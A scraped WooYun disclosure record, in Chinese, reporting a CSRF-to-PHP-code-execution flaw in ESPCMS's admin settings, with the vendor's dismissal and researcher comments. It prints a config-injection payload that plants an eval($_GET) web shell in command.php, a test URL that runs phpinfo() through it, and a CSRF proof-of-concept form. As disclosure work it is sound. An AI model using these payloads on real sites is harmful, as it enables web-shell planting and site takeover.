{"id": 7245, "wybug_id": "wooyun-2013-038391", "wybug_title": "代码审计系列4: 易思ESPCMS后台功能CSRF导致PHP代码执行", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "LaiX", "wybug_date": "2013-09-28 11:39", "wybug_open_date": "2013-12-24 11:40", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "任意文件写入利用", "敏感文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-08：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向公众公开  简要描述： 暂无 详细说明：  这是一个后台GETSHELL的漏洞，但是由于该程序没有对CSRF进行防御，所以可以导致CSRF直接GETshell，并且加重危害   漏洞证明：  问题页面：后台-系统设置-网站基本参数设置对输入的数据并没有进行太过严格的过滤可以导致直接写入恶意PHP代码进配置文件这里我们来测试一下'网站名称'这一项。我们构造：\n',//hello\n\n\n保存之后，我们来看看(command.php)\n\n然后我们进一步构造：\n',);eval($_GET['x']);$CONFIG=Array(//\n\n\n保存之后，我们来看看(command.php)\n\n看起来没问题，我们试着访问\nhttp://127.0.0.1:8080/espcms/datacache/command.php?x=phpinfo();\n\n\n接下来给出CSRF的测试代码\n<form id='test_form' action='http://127.0.0.1:8080/espcms/adminsoft/index.php?archive=management&action=setsave' method='POST' >   <input type='hidden' name='sitename' value='getshell啦' >   <input type='submit' name='submit' value='submit' ></form>\n   修复方案：  过滤严格一点吧   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-24 11:40 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-09 20:35 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  靠 都已经自动忽略了 赶紧来认领啊， 不行！！求补偿！！    \n     2013-10-10 10:18 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @LaiX 同情一下    \n     2013-10-12 09:17 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  @wefgod 感觉不会再爱了    \n     2013-10-12 09:18 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @LaiX 辛苦了！    \n     2013-10-25 15:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个好像还不错啊    \n     2013-12-15 18:49 |    \t\tneal \t\t\t( 普通白帽子  |\t\t\t        Rank:219 漏洞数:23        )\t\t \n  骚年 为什么不考虑gpc    \n     2013-12-24 18:57 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  @neal 你是来关注安全的，还是来反驳我达到装逼目的的。不管有没有开，并不代表漏洞不存在。    \n     2014-07-17 20:33 |    \t\tsec_jtn \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:56        | 本想无耻的刷rank，最后发现是我想太多了。...)\t\t \n  @LaiX 大牛可以把这句话改为签名了            你是来关注安全的，还是来反驳我达到装逼目的的。不管有没有开，并不代表漏洞不存在。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}